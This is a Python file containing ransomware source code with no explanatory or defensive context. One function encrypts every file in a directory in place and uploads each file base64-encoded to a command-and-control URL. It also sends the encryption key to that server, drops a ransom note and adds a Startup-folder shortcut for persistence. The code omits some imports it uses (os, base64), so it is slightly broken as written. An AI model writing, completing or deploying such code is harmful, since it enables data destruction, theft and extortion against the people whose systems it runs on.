from cryptography.fernet import Fernet
import requests
import winreg as reg
import win32com.client

def ransomware_with_data_exfiltration(directory: str, note: str, c2_url: str) -> None:
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    
    def encrypt_file(file_path):
        with open(file_path, 'rb') as file:
            file_data = file.read()
        encrypted_data = cipher_suite.encrypt(file_data)
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
    
    def exfiltrate_data(file_path):
        with open(file_path, 'rb') as file:
            file_data = file.read()
        encoded_data = base64.b64encode(file_data).decode('utf-8')
        requests.post(c2_url, json={'file': os.path.basename(file_path), 'data': encoded_data})
    
    def create_ransom_note(note_content):
        with open(os.path.join(directory, 'RANSOM_NOTE.txt'), 'w') as note_file:
            note_file.write(note_content)
    
    def ensure_persistence():
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(os.path.expanduser('~') + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ransomware.lnk')
        shortcut.TargetPath = os.path.abspath(__file__)
        shortcut.Save()
    
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path)
            exfiltrate_data(file_path)
    
    requests.post(c2_url, json={'key': key.decode('utf-8')})
    create_ransom_note(note)
    ensure_persistence()
